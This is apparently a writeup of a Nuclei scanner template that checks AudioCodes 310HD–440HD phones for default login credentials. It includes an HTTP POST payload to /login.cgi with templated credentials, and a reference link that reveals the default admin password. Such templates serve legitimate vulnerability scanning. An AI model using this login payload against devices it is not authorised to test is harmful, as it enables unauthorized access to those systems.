# Nuclei Template: AudioCodes 310HD, 320HD, 420HD, 430HD & 440HD - Default Login
**Template ID:** audiocodes-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`audiocodes-default-login.yaml`)

## Vulnerability Information & PoC

## Description
AudioCodes devices 310HD, 320HD, 420HD, 430HD & 440HD contain a default login vulnerability. Default login credentials were discovered. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /login.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user={{username}}&psw={{url_encode(base64("{{password}}"))}}
```

## References
- https://wiki.freepbx.org/display/FPG/Supported+Devices-Audio+Codes#:~:text=Reset%20to%20Factory%20Defaults,-Press%20the%20Menu&text=Then%2C%20enter%20the%20Admin%20password,is%20%221234%22%20by%20default
